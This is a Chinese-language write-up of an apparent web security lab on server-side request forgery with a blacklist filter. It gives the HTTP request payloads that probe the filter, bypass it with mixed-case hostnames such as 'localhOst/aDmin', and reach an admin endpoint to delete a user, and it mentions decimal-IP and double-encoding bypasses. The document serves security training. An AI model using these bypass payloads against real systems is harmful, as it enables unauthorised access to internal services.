# 实验：具有基于黑名单输入过滤器的 SSRF

本实验具有一个库存检查功能，该功能会从内部系统获取数据。

为了解决本实验，请更改库存检查 URL 以访问位于 `http://localhost/admin` 的管理员界面，并删除用户 `carlos`。

开发人员部署了两种薄弱的反 SSRF 防御措施，你需要绕过它们。

## 步骤

探测
- 使用商品详情页面的库存检查功能
    ```http
    POST /product/stock HTTP/2

    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    ```
    - 请求体参数值中存在 URL 格式

- 尝试访问本机管理端点
    `stockApi=http://localhost/admin`
    - 服务器响应 400
        `"External stock check blocked for security reasons"`


过滤器探测
- 使用良性请求作为基准
    `stockApi=http://stock.weliketoshop.net:8080`
    - 服务器响应
        `"Missing parameter"`
        - 作为成功触点

- 测试字符串
    - `stockApi=http://stock.weliketoshop.net:8080/localhost`
    - `stockApi=http://stock.weliketoshop.net:8080/admin`
    - 均响应
        `"External stock check blocked for security reasons"`
        - 作为阻止触点

- 测试大小写
    - `stockApi=http://stock.weliketoshop.net:8080/aDmin`
        - 未被阻止

- 使用大小写混淆后访问服务器本机管理员端点
    `stockApi=http://localhOst/aDmin`
    - 服务器响应
        ```html
        <div>
        <span>
            carlos - 
        </span>
        <a href="/admin/delete?username=carlos">
            Delete
        </a>
        </div>
        ```
        - SSRF 成功，访问管理员页面，同时得到删除功能端点
    
- 访问删除功能端点
    `stockApi=http://localhOst/aDmin/delete?username=carlos`


示例解决方案
- 点分十进制主机名
- 双重编码端点
